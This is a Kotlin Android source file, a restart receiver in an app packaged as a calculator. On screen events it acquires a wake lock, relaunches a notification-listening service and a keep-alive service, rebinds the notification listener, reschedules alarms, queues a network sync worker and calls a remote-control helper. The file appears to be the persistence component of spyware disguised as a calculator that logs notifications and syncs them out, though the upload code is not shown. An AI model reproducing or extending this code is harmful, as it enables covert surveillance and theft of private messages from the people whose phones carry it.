package com.android.mycalculator
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.service.notification.NotificationListenerService
import android.util.Log

class RestartReceiver : BroadcastReceiver() {
    
    override fun onReceive(context: Context, intent: Intent) {
        Log.d("RestartReceiver", "Trigger: ${intent.action}")
        if (intent.action == Intent.ACTION_SCREEN_OFF || intent.action == Intent.ACTION_SCREEN_ON) {
            RemoteControlHelper.stopRinging(context)
        }
        // Acquire wake lock
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "NotifyLog:RestartWakeLock"
        )
        wakeLock.acquire(15000) // 15 seconds
        
        try {
            restartAllServices(context)
            AlarmScheduler.scheduleAlarms(context)
            val constraints = androidx.work.Constraints.Builder()
                .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                .build()

            val instantSyncWork = androidx.work.OneTimeWorkRequestBuilder<SyncWorker>()
                .setConstraints(constraints)
                .build()

            androidx.work.WorkManager.getInstance(context).enqueueUniqueWork(
                "ReconnectSyncWork",
                androidx.work.ExistingWorkPolicy.REPLACE,
                instantSyncWork
            )
            
        } finally {
            if (wakeLock.isHeld) {
                wakeLock.release()
            }
        }
    }
    
    private fun restartAllServices(context: Context) {
        // Start main notification service
        val notificationIntent = Intent(context, NotificationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(notificationIntent)
        } else {
            context.startService(notificationIntent)
        }
        
        // Start keep alive service
        val keepAliveIntent = Intent(context, KeepAliveService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(keepAliveIntent)
        } else {
            context.startService(keepAliveIntent)
        }
        
        // Rebind notification listener
        val componentName = ComponentName(context, NotificationService::class.java)
        NotificationListenerService.requestRebind(componentName)
    }
}
